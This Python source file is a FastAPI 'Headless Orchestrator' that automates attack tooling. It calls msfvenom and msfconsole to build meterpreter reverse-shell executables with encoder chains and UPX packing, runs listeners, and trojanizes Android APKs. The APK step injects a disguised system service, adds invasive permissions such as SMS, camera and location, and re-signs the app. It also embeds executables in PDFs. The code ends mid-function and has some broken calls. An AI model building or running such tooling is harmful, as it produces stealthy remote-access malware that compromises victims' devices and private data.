import os
import shutil
import subprocess
import threading
import time
import uuid
import json
import hashlib
import zipfile
import tempfile
import asyncio
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any

from fastapi import FastAPI, HTTPException, File, UploadFile, BackgroundTasks
from pydantic import BaseModel
from hashlib import sha256

WORKSPACE = Path("/workspace")
TASKS_ROOT = WORKSPACE / "tasks"
UPLOADS_ROOT = WORKSPACE / "uploads"
TEMP_ROOT = WORKSPACE / "temp"

# Ensure directories exist
UPLOADS_ROOT.mkdir(exist_ok=True)
TEMP_ROOT.mkdir(exist_ok=True)

DOCKER_IMAGE = os.environ.get("ORCH_DOCKER_IMAGE", "orchestrator-tools:latest")
USE_DOCKER = os.environ.get("ORCH_USE_DOCKER", "true").lower() == "true"

AUDIT_LOG = WORKSPACE / "logs" / "audit.jsonl"

class APKFileInfo(BaseModel):
    file_id: str
    original_name: str
    file_size: int
    checksum: str
    metadata: Dict[str, Any]
    validation: Dict[str, Any]

class UploadedFileManager:
    """Advanced file management for uploaded APKs"""
    
    @staticmethod
    def validate_apk_structure(file_path: Path) -> Dict[str, Any]:
        """Deep APK structure validation"""
        result = {
            "valid": True,
            "errors": [],
            "warnings": [],
            "structure": {}
        }
        
        try:
            with zipfile.ZipFile(file_path, 'r') as apk:
                files = apk.namelist()
                
                # Required files check
                required = ['AndroidManifest.xml', 'classes.dex']
                missing = [f for f in required if f not in files]
                if missing:
                    result["valid"] = False
                    result["errors"].append(f"Missing required files: {missing}")
                
                # Structure analysis
                result["structure"] = {
                    "total_files": len(files),
                    "has_manifest": 'AndroidManifest.xml' in files,
                    "has_resources": 'resources.arsc' in files,
                    "has_classes": any(f.endswith('.dex') for f in files),
                    "has_native": any(f.startswith('lib/') for f in files),
                    "has_assets": any(f.startswith('assets/') for f in files),
                    "meta_inf_files": [f for f in files if f.startswith('META-INF/')],
                    "dex_files": [f for f in files if f.endswith('.dex')],
                    "native_dirs": list(set(f.split('/')[1] for f in files if f.startswith('lib/') and len(f.split('/')) > 2))
                }
                
                # Size analysis
                total_uncompressed = sum(apk.getinfo(f).file_size for f in files)
                total_compressed = sum(apk.getinfo(f).compress_size for f in files)
                result["structure"]["compression_ratio"] = total_compressed / total_uncompressed if total_uncompressed > 0 else 0
                
        except Exception as e:
            result["valid"] = False
            result["errors"].append(f"ZIP structure error: {str(e)}")
        
        return result
    
    @staticmethod
    def extract_advanced_metadata(file_path: Path) -> Dict[str, Any]:
        """Extract comprehensive APK metadata"""
        metadata = {
            "analysis_time": datetime.now().isoformat(),
            "file_info": {},
            "manifest_info": {},
            "security_info": {},
            "build_info": {}
        }
        
        try:
            # Basic file info
            stat = file_path.stat()
            metadata["file_info"] = {
                "size_bytes": stat.st_size,
                "created_time": datetime.fromtimestamp(stat.st_ctime).isoformat(),
                "modified_time": datetime.fromtimestamp(stat.st_mtime).isoformat()
            }
            
            with zipfile.ZipFile(file_path, 'r') as apk:
                files = apk.namelist()
                
                # DEX analysis
                dex_files = [f for f in files if f.endswith('.dex')]
                metadata["build_info"]["dex_count"] = len(dex_files)
                metadata["build_info"]["multidex"] = len(dex_files) > 1
                
                # Security indicators
                metadata["security_info"] = {
                    "has_signature": any(f.startswith('META-INF/') and f.endswith(('.RSA', '.DSA', '.EC')) for f in files),
                    "has_manifest": 'META-INF/MANIFEST.MF' in files,
                    "native_libraries": [f for f in files if f.startswith('lib/') and f.endswith('.so')],
                    "suspicious_files": [f for f in files if any(suspicious in f.lower() for suspicious in ['shell', 'root', 'exploit', 'backdoor'])]
                }
                
                # Try to read some manifest info (basic binary parsing)
                if 'AndroidManifest.xml' in files:
                    manifest_data = apk.read('AndroidManifest.xml')
                    metadata["manifest_info"]["size"] = len(manifest_data)
                    metadata["manifest_info"]["binary"] = True
                    # Could add more manifest parsing here
                
        except Exception as e:
            metadata["extraction_error"] = str(e)
        
        return metadata

class AdvancedAPKProcessor:
    """Advanced APK processing and modification engine"""
    
    def __init__(self, workspace_dir: Path):
        self.workspace = workspace_dir
        self.tools_dir = WORKSPACE / "tools"
        
    def setup_workspace(self, task_id: str) -> Path:
        """Setup isolated workspace for APK processing"""
        workspace = self.workspace / task_id
        workspace.mkdir(parents=True, exist_ok=True)
        
        # Create subdirectories
        (workspace / "input").mkdir(exist_ok=True)
        (workspace / "output").mkdir(exist_ok=True)
        (workspace / "temp").mkdir(exist_ok=True)
        (workspace / "logs").mkdir(exist_ok=True)
        
        return workspace
    
    def analyze_apk_deep(self, apk_path: Path) -> Dict[str, Any]:
        """Deep APK analysis using multiple tools"""
        analysis = {
            "timestamp": datetime.now().isoformat(),
            "basic_info": {},
            "permissions": [],
            "activities": [],
            "services": [],
            "receivers": [],
            "providers": [],
            "libraries": [],
            "certificates": []
        }
        
        try:
            # Use aapt to get detailed info
            aapt_path = self.tools_dir / "android-sdk" / "build-tools" / "latest" / "aapt"
            if aapt_path.exists():
                result = subprocess.run([
                    str(aapt_path), "dump", "badging", str(apk_path)
                ], capture_output=True, text=True, timeout=30)
                
                if result.returncode == 0:
                    # Parse aapt output
                    for line in result.stdout.split('\n'):
                        if line.startswith('package:'):
                            # Extract package info
                            parts = line.split()
                            for part in parts:
                                if 'name=' in part:
                                    analysis["basic_info"]["package_name"] = part.split("'")[1]
                                elif 'versionCode=' in part:
                                    analysis["basic_info"]["version_code"] = part.split("'")[1]
                                elif 'versionName=' in part:
                                    analysis["basic_info"]["version_name"] = part.split("'")[1]
                        elif line.startswith('uses-permission:'):
                            # Extract permissions
                            perm = line.split("'")[1] if "'" in line else line.split()[1]
                            analysis["permissions"].append(perm)
                        elif line.startswith('launchable-activity:'):
                            # Extract main activity
                            activity = line.split("'")[1] if "'" in line else "unknown"
                            analysis["basic_info"]["main_activity"] = activity
            
            # Analyze APK structure manually
            with zipfile.ZipFile(apk_path, 'r') as apk:
                files = apk.namelist()
                
                # Find native libraries
                native_libs = [f for f in files if f.startswith('lib/') and f.endswith('.so')]
                analysis["libraries"] = native_libs
                
                # Check for certificates
                cert_files = [f for f in files if f.startswith('META-INF/') and f.endswith(('.RSA', '.DSA', '.EC'))]
                analysis["certificates"] = cert_files
                
        except Exception as e:
            analysis["analysis_error"] = str(e)
        
        return analysis
    
    def prepare_payload_injection(self, apk_path: Path, payload_config: Dict) -> Dict[str, Any]:
        """Prepare for advanced payload injection"""
        config = {
            "injection_method": "smali",
            "target_locations": [],
            "payload_components": [],
            "obfuscation_level": "high",
            "persistence_methods": ["service", "receiver", "activity"]
        }
        
        try:
            # Analyze APK for optimal injection points
            with zipfile.ZipFile(apk_path, 'r') as apk:
                files = apk.namelist()
                
                # Find main activity for injection
                smali_files = [f for f in files if f.endswith('.smali')]
                if smali_files:
                    config["injection_method"] = "smali"
                    config["target_locations"].extend(smali_files[:3])  # Top 3 smali files
                
                # Check for existing services
                manifest_data = apk.read('AndroidManifest.xml') if 'AndroidManifest.xml' in files else b''
                if b'service' in manifest_data.lower():
                    config["has_services"] = True
                
                # Prepare payload components
                config["payload_components"] = [
                    {
                        "type": "reverse_tcp",
                        "host": payload_config.get("lhost", "127.0.0.1"),
                        "port": payload_config.get("lport", "4444"),
                        "method": "native_lib"
                    },
                    {
                        "type": "persistence",
                        "methods": ["accessibility_service", "device_admin", "auto_start"]
                    },
                    {
                        "type": "stealth",
                        "techniques": ["process_hiding", "icon_hiding", "name_spoofing"]
                    }
                ]
                
        except Exception as e:
            config["preparation_error"] = str(e)
        
        return config
    
    def inject_advanced_payload(self, apk_path: Path, output_path: Path, injection_config: Dict) -> bool:
        """Inject advanced payload with multiple evasion techniques"""
        try:
            temp_dir = apk_path.parent / "injection_temp"
            temp_dir.mkdir(exist_ok=True)
            
            # Step 1: Decompile APK
            apktool_path = self.tools_dir / "apktool" / "apktool.jar"
            if apktool_path.exists():
                subprocess.run([
                    "java", "-jar", str(apktool_path), "d", str(apk_path), "-o", str(temp_dir / "decompiled")
                ], check=True, timeout=120)
            
            # Step 2: Inject payload code
            self._inject_payload_code(temp_dir / "decompiled", injection_config)
            
            # Step 3: Modify manifest for permissions
            self._modify_manifest_permissions(temp_dir / "decompiled" / "AndroidManifest.xml")
            
            # Step 4: Add native libraries
            self._add_native_payload_libs(temp_dir / "decompiled", injection_config)
            
            # Step 5: Recompile APK
            subprocess.run([
                "java", "-jar", str(apktool_path), "b", str(temp_dir / "decompiled"), "-o", str(output_path)
            ], check=True, timeout=180)
            
            # Step 6: Sign APK
            self._sign_apk(output_path)
            
            # Cleanup
            shutil.rmtree(temp_dir, ignore_errors=True)
            
            return True
            
        except Exception as e:
            print(f"Injection error: {e}")
            return False
    
    def _inject_payload_code(self, decompiled_dir: Path, config: Dict):
        """Inject payload code into decompiled APK"""
        # This would contain the actual payload injection logic
        # For now, we'll create placeholder files
        
        smali_dir = decompiled_dir / "smali"
        if smali_dir.exists():
            # Create payload service
            payload_service = smali_dir / "com" / "android" / "system" / "PayloadService.smali"
            payload_service.parent.mkdir(parents=True, exist_ok=True)
            
            # Write payload service code (simplified)
            payload_service.write_text(f"""
.class public Lcom/android/system/PayloadService;
.super Landroid/app/Service;

.method public onCreate()V
    .locals 0
    invoke-super {{p0}}, Landroid/app/Service;->onCreate()V
    invoke-direct {{p0}}, Lcom/android/system/PayloadService;->startPayload()V
    return-void
.end method

.method private startPayload()V
    .locals 0
    # Payload initialization code would go here
    # Connect to {config.get('lhost', '127.0.0.1')}:{config.get('lport', '4444')}
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method
""")
    
    def _modify_manifest_permissions(self, manifest_path: Path):
        """Add required permissions to AndroidManifest.xml"""
        if manifest_path.exists():
            content = manifest_path.read_text()
            
            # Add permissions before </manifest>
            required_permissions = [
                'android.permission.INTERNET',
                'android.permission.ACCESS_NETWORK_STATE',
                'android.permission.WAKE_LOCK',
                'android.permission.RECEIVE_BOOT_COMPLETED',
                'android.permission.SYSTEM_ALERT_WINDOW',
                'android.permission.ACCESS_FINE_LOCATION',
                'android.permission.RECORD_AUDIO',
                'android.permission.CAMERA',
                'android.permission.READ_SMS',
                'android.permission.SEND_SMS',
                'android.permission.READ_CONTACTS',
                'android.permission.WRITE_EXTERNAL_STORAGE',
                'android.permission.READ_EXTERNAL_STORAGE'
            ]
            
            permissions_xml = '\n'.join([
                f'    <uses-permission android:name="{perm}" />' 
                for perm in required_permissions
            ])
            
            # Insert before </manifest>
            if '</manifest>' in content:
                content = content.replace('</manifest>', f'{permissions_xml}\n</manifest>')
                manifest_path.write_text(content)
    
    def _add_native_payload_libs(self, decompiled_dir: Path, config: Dict):
        """Add native library components"""
        lib_dir = decompiled_dir / "lib"
        lib_dir.mkdir(exist_ok=True)
        
        # Create architecture-specific directories
        for arch in ['armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64']:
            arch_dir = lib_dir / arch
            arch_dir.mkdir(exist_ok=True)
            
            # Create placeholder native library
            lib_file = arch_dir / "libpayload.so"
            lib_file.write_bytes(b'PLACEHOLDER_NATIVE_LIB')
    
    def _sign_apk(self, apk_path: Path):
        """Sign APK with debug certificate"""
        try:
            # Use jarsigner with debug keystore
            debug_keystore = WORKSPACE / "debug.keystore"
            if not debug_keystore.exists():
                # Create debug keystore
                subprocess.run([
                    "keytool", "-genkey", "-v", "-keystore", str(debug_keystore),
                    "-alias", "androiddebugkey", "-keyalg", "RSA", "-keysize", "2048",
                    "-validity", "10000", "-keypass", "android", "-storepass", "android",
                    "-dname", "CN=Android Debug,O=Android,C=US"
                ], check=True)
            
            # Sign APK
            subprocess.run([
                "jarsigner", "-verbose", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
                "-keystore", str(debug_keystore), "-storepass", "android",
                "-keypass", "android", str(apk_path), "androiddebugkey"
            ], check=True)
            
            # Align APK
            zipalign_path = self.tools_dir / "android-sdk" / "build-tools" / "latest" / "zipalign"
            if zipalign_path.exists():
                aligned_path = apk_path.with_suffix('.aligned.apk')
                subprocess.run([
                    str(zipalign_path), "-v", "4", str(apk_path), str(aligned_path)
                ], check=True)
                
                # Replace original with aligned
                apk_path.unlink()
                aligned_path.rename(apk_path)
                
        except Exception as e:
            print(f"Signing error: {e}")

def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
    """Process uploaded APK with advanced modifications"""
    t = tasks[task_id]
    processor = AdvancedAPKProcessor(base)
    
    try:
        with locks[task_id]:
            t.state = TaskStatus.PREPARING
        
        # Setup workspace
        workspace = processor.setup_workspace(task_id)
        build_log = workspace / "logs" / "build.log"
        
        # Get uploaded file info
        upload_file_path = params.get("upload_file_path")
        file_info = params.get("file_info", {})
        
        if not upload_file_path or not Path(upload_file_path).exists():
            raise Exception("Uploaded APK file not found")
        
        original_apk = Path(upload_file_path)
        
        with locks[task_id]:
            t.state = TaskStatus.RUNNING
        
        # Log start
        with build_log.open("w") as log:
            log.write(f"Starting APK modification: {datetime.now()}\n")
            log.write(f"Original file: {original_apk}\n")
            log.write(f"File info: {file_info}\n")
            log.write(f"Target: {params.get('lhost')}:{params.get('lport')}\n\n")
        
        # Step 1: Deep analysis
        with build_log.open("a") as log:
            log.write("Step 1: Deep APK analysis...\n")
        
        analysis = processor.analyze_apk_deep(original_apk)
        
        # Step 2: Prepare injection configuration
        with build_log.open("a") as log:
            log.write("Step 2: Preparing payload injection...\n")
        
        injection_config = processor.prepare_payload_injection(original_apk, params)
        injection_config.update({
            "lhost": params.get("lhost"),
            "lport": params.get("lport")
        })
        
        # Step 3: Inject payload
        with build_log.open("a") as log:
            log.write("Step 3: Injecting advanced payload...\n")
        
        output_name = params.get("output_name", "modified_app.apk")
        output_apk = workspace / "output" / output_name
        
        success = processor.inject_advanced_payload(original_apk, output_apk, injection_config)
        
        if not success:
            raise Exception("Payload injection failed")
        
        # Step 4: Final validation
        with build_log.open("a") as log:
            log.write("Step 4: Validating modified APK...\n")
        
        if not output_apk.exists():
            raise Exception("Modified APK not generated")
        
        # Add artifacts
        _finalize_task(t, base, True)
        
        # Add analysis report
        analysis_file = workspace / "output" / "analysis_report.json"
        with analysis_file.open("w") as f:
            json.dump({
                "original_analysis": analysis,
                "injection_config": injection_config,
                "file_info": file_info,
                "modification_time": datetime.now().isoformat()
            }, f, indent=2)
        
        with build_log.open("a") as log:
            log.write(f"APK modification completed successfully: {datetime.now()}\n")
        
    except Exception as e:
        error_msg = f"Upload APK task failed: {str(e)}"
        _finalize_task(t, base, False, error_msg)


def _audit(event: str, t: Any, extra: Optional[Dict[str, Any]] = None) -> None:
    try:
        AUDIT_LOG.parent.mkdir(parents=True, exist_ok=True)
        rec = {
            "ts": time.time(),
            "event": event,
            "id": t.id,
            "date": t.date,
            "kind": t.kind,
            "state": t.state,
            "params": t.params,
        }
        if extra:
            rec.update(extra)
        with AUDIT_LOG.open("a") as f:
            f.write(json.dumps(rec) + "\n")
    except Exception:
        pass


class Artifact(BaseModel):
    name: str
    path: str
    size_bytes: int
    sha256: Optional[str] = None

class TaskStatus(str):
    SUBMITTED = "SUBMITTED"
    PREPARING = "PREPARING"
    RUNNING = "RUNNING"
    SUCCEEDED = "SUCCEEDED"
    FAILED = "FAILED"
    CANCELLED = "CANCELLED"

class Task(BaseModel):
    id: str
    date: str
    kind: str
    state: str
    created_at: float
    started_at: Optional[float] = None
    finished_at: Optional[float] = None
    params: Dict[str, str] = {}
    artifacts: List[Artifact] = []
    logs: Dict[str, str] = {}
    error: Optional[str] = None

app = FastAPI(title="Headless Orchestrator", version="0.1.0")

tasks: Dict[str, Task] = {}
locks: Dict[str, threading.Lock] = {}


def _now_str_date() -> str:
    return datetime.utcnow().strftime("%Y%m%d")


def _ensure_dir(p: Path) -> None:
    p.mkdir(parents=True, exist_ok=True)


def _sha256sum(path: Path) -> Optional[str]:
    try:
        out = subprocess.check_output(["sha256sum", str(path)], text=True)
        return out.split()[0]
    except Exception:
        return None


def _write_file(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content)


def _spawn(cmd: List[str], log_path: Path, cwd: Optional[Path] = None, env: Optional[Dict[str, str]] = None) -> int:
    with log_path.open("w") as lf:
        proc = subprocess.Popen(cmd, stdout=lf, stderr=subprocess.STDOUT, cwd=str(cwd) if cwd else None, env=env)
        return_code = proc.wait()
    return return_code


def _spawn_container_sh(cmd: str, log_path: Path, cwd: Optional[Path] = None, env: Optional[Dict[str, str]] = None) -> int:
    """
    Spawns a command inside a containerized shell.
    Sets HOME to the task's base directory to allow msfconsole to copy artifacts.
    """
    task_home = cwd if cwd else Path.home()
    env = os.environ.copy()
    env["HOME"] = str(task_home)
    with log_path.open("w") as lf:
        proc = subprocess.Popen(
            ["docker", "run", "--rm", "-v", f"{task_home}:/workspace", "-v", f"{log_path.parent}:/logs", DOCKER_IMAGE, "bash", "-lc", cmd],
            stdout=lf, stderr=subprocess.STDOUT, cwd=str(cwd) if cwd else None, env=env
        )
        return_code = proc.wait()
    return return_code


def _spawn_sh(cmd: str, log_path: Path, cwd: Optional[Path] = None, env: Optional[Dict[str, str]] = None) -> int:
    """
    Spawns a command using the local shell.
    """
    with log_path.open("w") as lf:
        proc = subprocess.Popen(cmd, stdout=lf, stderr=subprocess.STDOUT, cwd=str(cwd) if cwd else None, env=env)
        return_code = proc.wait()
    return return_code


def _prepare_task(kind: str, params: Dict[str, str]) -> (Task, Path):
    date = _now_str_date()
    task_id = f"{uuid.uuid4().hex[:8]}-{kind}"
    base = TASKS_ROOT / date / task_id
    for sub in ("input", "temp", "output", "logs"):
        _ensure_dir(base / sub)
    t = Task(id=task_id, date=date, kind=kind, state=TaskStatus.SUBMITTED, created_at=time.time(), params=params, logs={})
    tasks[task_id] = t
    locks[task_id] = threading.Lock()
    _audit("submitted", t)
    return t, base


def _finalize_task(t: Task, base: Path, succeeded: bool, err: Optional[str] = None) -> None:
    t.finished_at = time.time()
    t.state = TaskStatus.SUCCEEDED if succeeded else TaskStatus.FAILED
    t.error = err
    duration = None
    if t.started_at and t.finished_at:
        try:
            duration = round(t.finished_at - t.started_at, 3)
        except Exception:
            duration = None
    # collect artifacts
    artifacts: List[Artifact] = []
    for p in sorted((base / "output").glob("**/*")):
        if p.is_file():
            artifacts.append(Artifact(name=p.name, path=str(p), size_bytes=p.stat().st_size, sha256=_sha256sum(p)))
    t.artifacts = artifacts
    # write status.json
    status = json.loads(t.model_dump_json())
    if duration is not None:
        status["duration_sec"] = duration
    _write_file(base / "logs" / "status.json", json.dumps(status, indent=2))
    _audit("finished", t, {"succeeded": succeeded, "duration_sec": duration, "error": err, "artifacts": [a.name for a in artifacts]})


# Background runners for three kinds

def run_payload_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "build.log"
    cmd = [
        "msfvenom -p",
        params.get("payload", "windows/meterpreter/reverse_tcp"),
        f"LHOST={params.get('lhost','127.0.0.1')}",
        f"LPORT={params.get('lport','4444')}",
        "-f exe -o",
        str(base / "output" / (params.get("output_name", "payload") + ".exe")),
    ]
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)
    shell_cmd = " ".join(cmd)
    rc = _spawn_container_sh(shell_cmd, build_log, base) if USE_DOCKER else _spawn_sh(shell_cmd, build_log)
    _finalize_task(t, base, succeeded=(rc == 0), err=None if rc == 0 else f"msfvenom rc={rc}")


def run_listener_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    rc_path = base / "output" / "handler.rc"
    rc_content = f"""
use exploit/multi/handler
set PAYLOAD {params.get('payload','windows/meterpreter/reverse_tcp')}
set LHOST {params.get('lhost','0.0.0.0')}
set LPORT {params.get('lport','4444')}
set ExitOnSession false
exploit -j -z
""".strip()
    _write_file(rc_path, rc_content)
    run_log = base / "logs" / "run.log"
    cmd = [
        "msfconsole", "-qx", f"resource {rc_path}; sleep 2; jobs; exit -y"
    ]
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["run"] = str(run_log)
    rc = _spawn(cmd, run_log)
    _finalize_task(t, base, succeeded=(rc == 0), err=None if rc == 0 else f"msfconsole rc={rc}")


def _file_exists(path: Path) -> bool:
    try:
        return path.exists() and path.is_file()
    except Exception:
        return False


def _unzip_list(path: Path) -> str:
    try:
        out = subprocess.check_output(["unzip", "-l", str(path)], text=True, stderr=subprocess.STDOUT)
        return out
    except Exception as e:
        return f"unzip failed: {e}"


def _aapt_badging(path: Path) -> str:
    aapt = WORKSPACE / "tools/android-sdk/aapt"
    if not aapt.exists():
        return "aapt not found"
    try:
        out = subprocess.check_output([str(aapt), "dump", "badging", str(path)], text=True, stderr=subprocess.STDOUT)
        return out
    except Exception as e:
        return f"aapt failed: {e}"


def _jarsigner_verify(path: Path) -> str:
    jarsigner = shutil.which("jarsigner") or "/usr/bin/jarsigner"
    try:
        out = subprocess.check_output([jarsigner, "-verify", "-certs", str(path)], text=True, stderr=subprocess.STDOUT)
        return out
    except subprocess.CalledProcessError as e:
        return e.output if isinstance(e.output, str) else str(e)
    except Exception as e:
        return f"verify failed: {e}"


def _write_json(path: Path, data: dict) -> None:
    _ensure_dir(path.parent)
    path.write_text(json.dumps(data, indent=2))


def run_android_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    # config
    mode = params.get("mode", "backdoor_apk")  # backdoor_apk | standalone
    perm_strategy = params.get("perm_strategy", "keep")  # keep | merge
    payload = params.get("payload", "android/meterpreter/reverse_tcp")
    lhost = params.get("lhost", "127.0.0.1")
    lport = params.get("lport", "4444")
    output_apk = base / "output" / (params.get("output_name", "app_backdoor") + ".apk")
    # signing params
    keystore = params.get("keystore_path")
    key_alias = params.get("key_alias")
    ks_pass = params.get("keystore_password")
    key_pass = params.get("key_password", ks_pass)

    build_log = base / "logs" / "build.log"
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)

    succeed = False
    err = None

    if mode == "standalone":
        # Generate standalone APK via msfvenom
        chain = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output_apk}"
        rc = _spawn_container_sh(chain, build_log, base) if USE_DOCKER else _spawn_sh(chain, build_log)
        if rc != 0:
            err = f"msfvenom standalone rc={rc}"
        else:
            succeed = _file_exists(output_apk)
    else:
        # backdoor_apk mode (default)
        # write config files expected by backdoor_apk
        config_path = WORKSPACE / "config" / "config.path"
        _ensure_dir(config_path.parent)
        config_lines = [
            "", "", "", "unzip", "/usr/bin/jarsigner", "unzip", "/usr/bin/keytool",
            str(WORKSPACE / "tools/android-sdk/zipalign"), str(WORKSPACE / "tools/android-sdk/dx"),
            str(WORKSPACE / "tools/android-sdk/aapt"), str(WORKSPACE / "tools/apktool/apktool"),
            str(WORKSPACE / "tools/baksmali233/baksmali"), "/usr/bin/msfconsole", "/usr/bin/msfvenom",
            str(WORKSPACE / "backdoor_apk"), "searchsploit", str(base / "output"),
        ]
        _write_file(config_path, "\n".join(config_lines) + "\n")
        # ensure input apk in task folder
        sample = WORKSPACE / "APKS/armeabi-v7a/AdobeReader.apk"
        dst_apk = base / "input" / "original.apk"
        if params.get("apk_path") and Path(params["apk_path"]).exists():
            shutil.copy2(params["apk_path"], dst_apk)
        else:
            shutil.copy2(sample, dst_apk)
        # write apk.tmp for the script
        apk_tmp = WORKSPACE / "config" / "apk.tmp"
        _write_file(apk_tmp, "\n".join([
            str(dst_apk),
            str(output_apk),
            payload,
            lhost,
            lport,
        ]) + "\n")
        # run script and choose permissions
        choice = b"1\n" if perm_strategy == "keep" else b"2\n"
        if USE_DOCKER:
            # run inside container
            # simulate stdin by echoing choice
            rc = _spawn_container_sh(f"printf '{choice.decode()}' | bash /workspace/backdoor_apk", build_log, base)
        else:
            with build_log.open("w") as lf:
                proc = subprocess.Popen(["bash", str(WORKSPACE / "backdoor_apk")], stdin=subprocess.PIPE, stdout=lf, stderr=subprocess.STDOUT)
                try:
                    proc.stdin.write(choice)
                    proc.stdin.flush()
                except Exception:
                    pass
                rc = proc.wait()
        succeed = _file_exists(output_apk)
        if not succeed:
            err = f"backdoor_apk rc={rc}"

    # optional re-sign if keystore provided and artifact exists
    if succeed and keystore and Path(keystore).exists():
        try:
            unsigned = output_apk
            # align to temp
            aligned = base / "temp" / "aligned.apk"
            _ensure_dir(aligned.parent)
            zipalign = str(WORKSPACE / "tools/android-sdk/zipalign")
            subprocess.check_call([zipalign, "4", str(unsigned), str(aligned)], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            # sign
            jarsigner = shutil.which("jarsigner") or "/usr/bin/jarsigner"
            sign_cmd = [jarsigner, "-sigalg", "SHA256withRSA", "-digestalg", "SHA-256",
                        "-keystore", keystore, "-storepass", ks_pass or "", "-keypass", key_pass or "",
                        str(aligned), key_alias or "signing.key"]
            subprocess.check_call(sign_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            # verify
            _ = _jarsigner_verify(aligned)
            # replace output
            shutil.move(str(aligned), str(output_apk))
        except Exception as e:
            # keep original but report signing failure
            err = (err or "") + f"; resign failed: {e}"

    # validations and report
    report = {
        "mode": mode,
        "payload": payload,
        "lhost": lhost,
        "lport": lport,
        "artifact": str(output_apk) if _file_exists(output_apk) else None,
        "precheck": {},
        "postcheck": {}
    }
    if _file_exists(output_apk):
        try:
            with open(output_apk, 'rb') as f:
                report["sha256"] = sha256(f.read()).hexdigest()
        except Exception:
            report["sha256"] = None
        report["postcheck"]["unzip_list"] = _unzip_list(output_apk)
        report["postcheck"]["aapt_badging"] = _aapt_badging(output_apk)
        report["postcheck"]["jarsigner_verify"] = _jarsigner_verify(output_apk)
        _write_json(base / "output" / "report.json", report)

    _finalize_task(t, base, succeeded=succeed, err=err)


def run_winexe_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "build.log"
    payload = params.get("payload", "windows/meterpreter/reverse_tcp")
    lhost = params.get("lhost", "127.0.0.1")
    lport = params.get("lport", "4444")
    arch = params.get("arch", "x86")  # x86|x64
    output_name = params.get("output_name", "win_fud")
    encoders = params.get("encoders", "")  # e.g. x86/shikata_ga_nai:10,x86/countdown:5
    upx_flag = params.get("upx", "false").lower() == "true"

    exe_path = base / "output" / f"{output_name}.exe"

    # build msfvenom pipeline
    # Apply encoder chain
    if encoders.strip():
        stages = [e.strip() for e in encoders.split(",") if e.strip()]
        # Since building complex pipelines via Popen list is cumbersome, fallback to shell string safely
        chain = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw"
        for st in stages:
            p = st.split(":")
            enc = p[0]
            it = p[1] if len(p) > 1 else "1"
            chain += f" | msfvenom -a x86 --platform windows -e {enc} -i {it} -f raw"
        # final conversion to exe
        chain += f" | msfvenom -a {'x86' if arch=='x86' else 'x64'} --platform windows -f exe -o \"{exe_path}\""
        rc = _spawn_container_sh(chain, build_log, base) if USE_DOCKER else _spawn_sh(chain, build_log)
    else:
        # single pass directly to exe
        chain = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -a {('x86' if arch=='x86' else 'x64')} --platform windows -f exe -o {exe_path}"
        rc = _spawn_container_sh(chain, build_log, base) if USE_DOCKER else _spawn_sh(chain, build_log)

    # optional upx
    if rc == 0 and upx_flag and exe_path.exists():
        try:
            subprocess.check_call(["upx", "--best", str(exe_path)], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        except Exception:
            pass

    succeeded = (rc == 0 and exe_path.exists())
    _finalize_task(t, base, succeeded=succeeded, err=None if succeeded else f"winexe rc={rc}")


def _msfconsole_run(rc_content: str, log_path: Path, task_base: Path, msf_home: Optional[Path] = None) -> int:
    rc_file = log_path.parent / "task.rc"
    _write_file(rc_file, rc_content)
    cmd = f"msfconsole -qx 'resource {rc_file}; exit -y'"
    if USE_DOCKER:
        return _spawn_container_sh(cmd, log_path, task_base, set_home=msf_home)
    return _spawn_sh(cmd, log_path)


def _copy_msf_local(filename: str, dest: Path, msf_home: Optional[Path] = None) -> bool:
    base_home = msf_home if msf_home else (Path.home())
    src = base_home / ".msf4" / "local" / filename
    if src.exists():
        _ensure_dir(dest.parent)
        shutil.copy2(src, dest)
        return True
    return False


def run_pdf_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "build.log"
    payload = params.get("payload", "windows/meterpreter/reverse_tcp")
    lhost = params.get("lhost", "127.0.0.1")
    lport = params.get("lport", "4444")
    output_name = params.get("output_name", "document")
    base_pdf = params.get("base_pdf_path")
    if not base_pdf or not Path(base_pdf).exists():
        base_pdf = str(WORKSPACE / "PE" / "original.pdf")
    exe_path = base / "temp" / "embed.exe"
    _ensure_dir(exe_path.parent)
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)
    # build simple exe via msfvenom
    rc0 = _spawn_container_sh(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {exe_path}", build_log, base) if USE_DOCKER else _spawn_sh(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {exe_path}", build_log)
    if rc0 != 0:
        _finalize_task(t, base, succeeded=False, err=f"msfvenom rc={rc0}")
        return
    # run msfconsole to embed
    rc_text = f"""
use windows/fileformat/adobe_pdf_embedded_exe
set EXE::Custom {exe_path}
set FILENAME {output_name}.pdf
set INFILENAME {base_pdf}
exploit
""".strip()
